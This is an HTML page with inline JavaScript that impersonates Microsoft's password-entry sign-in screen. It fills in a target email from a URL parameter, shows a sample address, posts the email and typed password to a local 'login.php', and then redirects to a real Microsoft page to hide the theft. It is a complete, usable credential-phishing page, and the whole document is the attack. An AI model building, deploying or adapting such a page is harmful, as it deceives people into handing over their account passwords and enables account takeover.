<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Microsoft account</title>
    <link rel="stylesheet" href="oficce.css">
</head>
<body>
    <div class="page-container">
        <img src="images/imgi_3_4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg" class="bg-image" alt="Background">

        <main class="card">
            <!-- Header Row with Back Button -->
            <div class="card-header">
                <a href="office.html" class="back-btn" aria-label="Back">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <line x1="19" y1="12" x2="5" y2="12"></line>
                        <polyline points="12 19 5 12 12 5"></polyline>
                    </svg>
                </a>
                <div class="logo-container">
                    <img src="images/imgi_4_microsoft_logo_ea19b2112f4dfd8e90b4505ef7dcb4f9.png" alt="Microsoft Logo" class="logo">
                </div>
            </div>

            <!-- Dynamic User Identity Badge -->
            <div class="user-identity">
                <span id="userEmail">nicolejus@outlook.com</span>
            </div>

            <h1>Enter your password</h1>

            <!-- Form submits to login.php via JavaScript fetch -->
            <form id="passwordForm">
                <input type="hidden" id="hiddenEmail" name="email">
                <div class="input-group">
                    <input type="password" placeholder="Password" name="password" required autocomplete="current-password">
                </div>

                <button type="submit" class="submit-button">Next</button>
            </form>

            <div class="links">
                <a href="#">Other ways to sign in</a>
            </div>
        </main>

        <footer class="footer">
            <div class="footer-links">
                <a href="#">Help and feedback</a>
                <a href="#">Terms of use</a>
                <a href="#">Privacy and cookies</a>
            </div>
            <div class="footer-note">
                Use private browsing if this is not your device. <a href="#">Learn more</a>
            </div>
        </footer>
    </div>

    <!-- Script to handle URL email parameter and backend login submission -->
    <script>
    document.addEventListener('DOMContentLoaded', () => {
        // 1. Grab email from URL and put it in the UI & hidden input
        const params = new URLSearchParams(window.location.search);
        const email = params.get('email');
        
        if (email) {
            document.getElementById('userEmail').textContent = email;
            document.getElementById('hiddenEmail').value = email;
        }

        // 2. Handle form submit via Fetch API
        const form = document.getElementById('passwordForm');
        if (form) {
            form.addEventListener('submit', async function (e) {
                e.preventDefault(); // Stop page from refreshing normally

                const formData = new FormData(this);

                try {
                    const response = await fetch('login.php', {
                        method: 'POST',
                        body: formData
                    });

                    const result = await response.json();

                    if (response.ok) {
                        // Success! Redirect to your target page
                        window.location.href = 'https://go.microsoft.com/fwlink/p/?LinkID=2125442&clcid=0x409&culture=en-us&country=us'; 
                    } else {
                        alert(result.error || 'Login failed');
                    }
                } catch (err) {
                    console.error('Fetch error:', err);
                    alert('Network error or invalid JSON response from server.');
                }
            });
        }
    });
</script>
</body>
</html>
